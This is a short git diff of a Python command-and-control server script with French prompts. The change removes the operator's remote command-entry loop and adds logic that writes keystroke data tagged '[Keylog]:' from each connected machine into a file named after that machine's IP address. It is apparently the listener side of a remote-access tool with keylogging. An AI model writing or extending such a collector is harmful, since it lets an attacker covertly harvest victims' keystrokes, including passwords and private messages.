@@ -6,16 +6,16 @@ port_number = 1234
 
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
+    keylog_file = f"keylog_{address[0]}.txt"
+
     while True:
         try:
-            command = input("Entrer une commande a exécuter : ")
-            if command.lower() == 'quit':
-                connection.send(b'quit')
-                break
-            connection.send(command.encode())
-
             response = connection.recv(4096).decode()
-            print(f"Output:\n{response}")
+            if "[Keylog]:" in response:
+                with open(keylog_file, "a") as file:
+                    file.write(response.replace("[Keylog]:\n", ""))
+            else:
+                print(f"Output:\n{response}")
         except Exception as e:
             print(f"Error: {e}")
             break
